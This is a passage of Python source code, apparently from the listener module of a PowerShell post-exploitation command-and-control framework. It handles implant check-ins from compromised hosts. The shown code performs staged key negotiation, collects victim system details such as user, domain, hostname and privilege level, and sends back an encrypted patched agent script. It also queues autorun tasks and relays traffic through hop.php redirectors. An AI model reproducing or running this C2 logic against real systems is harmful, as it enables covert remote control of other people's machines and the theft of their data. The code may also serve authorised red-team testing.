                    if decoded.count("/") == 2:
                        host = decoded
                    else:
                        # otherwise we have a http://server:port/hop.php listener
                        stage = self.mainMenu.stagers.generate_stager_hop(decoded, stagingkey, profile)

            if not stage:
                # generate the stage with appropriately patched information
                stage = self.mainMenu.stagers.generate_stager(host, stagingkey)

            # step 2 of negotiation -> return stager.ps1 (stage 1)
            return (200, stage)

        # default response
        else:
            # otherwise return the default page
            return (200, http.default_page())


    def process_post(self, port, clientIP, sessionID, resource, postData):
        """
        Process a POST request.
        """

        # check to make sure this IP is allowed
        if not self.is_ip_allowed(clientIP):
            dispatcher.send("[!] %s requested by %s on the blacklist/not on the whitelist." % (resource, clientIP), sender="Agents")
            return (200, http.default_page())

        # check if requested resource in is session URIs for any agent profiles in the database
        if self.is_uri_present(resource):

            # if the sessionID doesn't exist in the database
            if not self.is_agent_present(sessionID):

                # alert everyone to an irregularity
                dispatcher.send("[!] Agent %s posted results but isn't in the database!" % (sessionID), sender="Agents")
                return (404, "")

            # if the ID is currently in the database, process the results
            else:

                # extract the agent's session key
                session_key = self.agents[sessionID]['sessionKey']

                try:
                    # verify, decrypt and depad the packet
                    packet = encryption.aes_decrypt_and_verify(session_key, postData)

                    # update the client's last seen time
                    self.update_agent_lastseen(sessionID)

                    # process the packet and extract necessary data
                    #   [(responseName, counter, length, data), ...]
                    response_packets = packets.parse_result_packets(packet)

                    counter = response_packets[-1][1]

                    results = False

                    # validate the counter in the packet in the setcode.replace
                    if counter and packets.validate_counter(counter):

                        results = True

                        # process each result packet
                        for response_packet in response_packets:
                            (response_name, counter, length, taskID, data) = response_packet

                            # process the agent's response
                            self.handle_agent_response(sessionID, response_name, taskID, data)

                        if results:
                            # signal that this agent returned results
                            name = self.get_agent_name(sessionID)
                            dispatcher.send("[*] Agent %s returned results." % (name), sender="Agents")

                        # return a 200/valid
                        return (200, "")

                    else:
                        dispatcher.send("[!] Invalid counter value from %s" % (sessionID), sender="Agents")
                        return (404, "")

                except Exception as e:
                    dispatcher.send("[!] Error processing result packet from %s : %s" % (sessionID, e), sender="Agents")
                    return (404, "")


        # step 3 of negotiation -> client posts public key
        elif resource.lstrip("/").split("?")[0] == self.stage1:

            if self.args and self.args.debug:
                # dispatcher.send("[*] Agent "+str(sessionID)+" from "+str(clientIP)+" posted to public key URI", sender="Agents")
                dispatcher.send("[*] Agent %s from %s posted to public key URI" % (sessionID, clientIP), sender="Agents")

            # get the staging key for the given listener, keyed by port
            #   results: host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,lost_limit
            stagingKey = self.listeners.get_staging_information(port=port)[3]

            # decrypt the agent's public key
            message = encryption.aes_decrypt(stagingKey, postData)

            # strip non-printable characters
            message = ''.join(filter(lambda x: x in string.printable, message))

            # client posts RSA key
            if (len(message) < 400) or (not message.endswith("</RSAKeyValue>")):
                dispatcher.send("[!] Invalid key post format from %s" % (sessionID), sender="Agents")
            else:
                # convert the RSA key from the stupid PowerShell export format
                rsaKey = encryption.rsa_xml_to_key(message)

                if rsaKey:

                    if self.args and self.args.debug:
                        dispatcher.send("[*] Agent %s from %s posted valid RSA key" % (sessionID, clientIP), sender="Agents")

                    # get the epoch time to send to the client
                    epoch = packets.get_counter()

                    # get the staging key for the given listener, keyed by port
                    #   results: host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,listener_type,redirect_target,default_lost_limit
                    config = self.listeners.get_staging_information(port=port)
                    delay = config[4]
                    jitter = config[5]
                    profile = config[6]
                    killDate = config[7]
                    workingHours = config[8]
                    lostLimit = config[11]

                    # add the agent to the database now that it's "checked in"
                    self.add_agent(sessionID, clientIP, delay, jitter, profile, killDate, workingHours, lostLimit)

                    # step 4 of negotiation -> return epoch+aes_session_key
                    clientSessionKey = self.get_agent_session_key(sessionID)
                    data = str(epoch) + clientSessionKey
                    data = data.encode('ascii', 'ignore')

                    encryptedMsg = encryption.rsa_encrypt(rsaKey, data)

                    # return a 200/valid and encrypted stage to the agent
                    return (200, encryptedMsg)

                else:
                    dispatcher.send("[!] Agent %s returned an invalid public key!" % (sessionID), sender="Agents")
                    return (404, "")


        # step 5 of negotiation -> client posts sysinfo and requests agent
        elif resource.lstrip("/").split("?")[0] == self.stage2:

            if self.is_agent_present(sessionID):

                # if this is a hop.php relay
                if "?" in resource:
                    parts = resource.split("?")
                    if len(parts) == 2:
                        decoded = helpers.decode_base64(parts[1])

                        # get the staging key for the given listener, keyed by port
                        #   results: host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,lost_limit
                        config = self.listeners.get_staging_information(host=decoded)

                else:
                    config = self.listeners.get_staging_information(port=port)

                delay = config[4]
                jitter = config[5]
                profile = config[6]
                killDate = config[7]
                workingHours = config[8]
                lostLimit = config[11]

                # get the session key for the agent
                sessionKey = self.agents[sessionID]['sessionKey']

                try:
                    # decrypt and parse the agent's sysinfo checkin
                    data = encryption.aes_decrypt(sessionKey, postData)

                    parts = data.split("|")

                    if len(parts) < 10:
                        dispatcher.send("[!] Agent %s posted invalid sysinfo checkin format: %s" % (sessionID, data), sender="Agents")

                        # remove the agent from the cache/database
                        self.remove_agent(sessionID)
                        return (404, "")

                    dispatcher.send("[!] Agent %s posted valid sysinfo checkin format: %s" % (sessionID, data), sender="Agents")

                    listener = parts[0].encode('ascii', 'ignore')
                    domainname = parts[1].encode('ascii', 'ignore')
                    username = parts[2].encode('ascii', 'ignore')
                    hostname = parts[3].encode('ascii', 'ignore')
                    # external_ip = clientIP.encode('ascii', 'ignore')
                    internal_ip = parts[4].encode('ascii', 'ignore')
                    os_details = parts[5].encode('ascii', 'ignore')
                    high_integrity = parts[6].encode('ascii', 'ignore')
                    process_name = parts[7].encode('ascii', 'ignore')
                    process_id = parts[8].encode('ascii', 'ignore')
                    ps_version = parts[9].encode('ascii', 'ignore')

                    if high_integrity == "True":
                        high_integrity = 1
                    else:
                        high_integrity = 0

                except Exception:
                    # remove the agent from the cache/database
                    self.remove_agent(sessionID)
                    return (404, "")

                # let everyone know an agent got stage2
                if self.args and self.args.debug:
                    dispatcher.send("[*] Sending agent (stage 2) to %s at %s" % (sessionID, clientIP), sender="Agents")

                # step 6 of negotiation -> server sends patched agent.ps1
                agent_code = self.mainMenu.stagers.generate_agent(delay, jitter, profile, killDate, workingHours, lostLimit)

                username = "%s\\%s" % (domainname, username)

                # update the agent with this new information
                self.update_agent_sysinfo(sessionID, listener=listener, internal_ip=internal_ip, username=username, hostname=hostname, os_details=os_details, high_integrity=high_integrity, process_name=process_name, process_id=process_id, ps_version=ps_version)

                # encrypt the agent and send it back
                encrypted_agent = encryption.aes_encrypt(sessionKey, agent_code)

                # signal everyone that this agent is now active
                dispatcher.send("[+] Initial agent %s from %s now active" % (sessionID, clientIP), sender="Agents")
                output = "[+] Agent %s now active:\n" % (sessionID)

                # set basic initial information to display for the agent
                agent = self.mainMenu.agents.get_agent(sessionID)

                keys = ["ID", "sessionID", "listener", "name", "delay", "jitter", "external_ip", "internal_ip", "username", "high_integrity", "process_name", "process_id", "hostname", "os_details", "session_key", "checkin_time", "lastseen_time", "parent", "children", "servers", "uris", "old_uris", "user_agent", "headers", "functions", "kill_date", "working_hours", "ps_version", "lost_limit"]

                agent_info = dict(zip(keys, agent))

                for key in agent_info:
                    if key != "functions":
                        output += "  %s\t%s\n" % ('{0: <16}'.format(key), messages.wrap_string(agent_info[key], width=70))

                # save the initial sysinfo information in the agent log
                self.save_agent_log(sessionID, output + "\n")

                # if a script autorun is set, set that as the agent's first tasking
                autorun = self.get_autoruns()
                if autorun and autorun[0] != '' and autorun[1] != '':
                    self.add_agent_task(sessionID, autorun[0], autorun[1])

                return(200, encrypted_agent)

            else:
                dispatcher.send("[!] Agent %s posted sysinfo without initial checkin" % (sessionID), sender="Agents")
                return (404, "")

        # default behavior, 404
        else:
            return (404, "")
